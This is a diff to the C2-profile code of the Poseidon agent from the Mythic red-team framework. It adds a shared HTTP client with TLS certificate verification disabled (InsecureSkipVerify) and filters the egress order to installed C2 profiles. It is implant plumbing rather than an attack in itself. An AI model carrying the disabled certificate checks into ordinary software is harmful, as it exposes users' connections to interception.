@@ -1,12 +1,14 @@
 package profiles
 
 import (
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"log"
+	"net/http"
 	"strconv"
 	// Poseidon
 
@@ -42,6 +44,15 @@ var (
 	// availableC2Profiles map of C2 profile name to instance of that profile
 	availableC2Profiles = make(map[string]structs.Profile)
 )
+var tr = &http.Transport{
+	TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+	MaxIdleConns:      1,
+	MaxConnsPerHost:   1,
+	DisableKeepAlives: true,
+}
+var client = &http.Client{
+	Transport: tr,
+}
 
 // RegisterAvailableC2Profile adds a C2 Profile to availableC2Profiles for use with Start()
 func RegisterAvailableC2Profile(newProfile structs.Profile) {
@@ -63,12 +74,20 @@ func Initialize() {
 		utils.PrintDebug(fmt.Sprintf("Setting failedConnectionCountThreshold to 10: %v", err))
 		failedConnectionCountThreshold = 10
 	}
-	utils.PrintDebug(fmt.Sprintf("Egress order: %v", egressOrder))
+	utils.PrintDebug(fmt.Sprintf("Initial Egress order: %v", egressOrder))
 }
 
 // Start kicks off one egress and the p2p profiles
 func Start() {
 	// start one egress
+	installedC2 := []string{}
+	for _, egressC2 := range egressOrder {
+		if _, ok := availableC2Profiles[egressC2]; ok {
+			installedC2 = append(installedC2, egressC2)
+		}
+	}
+	egressOrder = installedC2
+	utils.PrintDebug(fmt.Sprintf("Fixed Egress order based on installed c2: %v", egressOrder))
 	for val, egressC2 := range egressOrder {
 		if val == currentConnectionID {
 			foundCurrentConnection := false
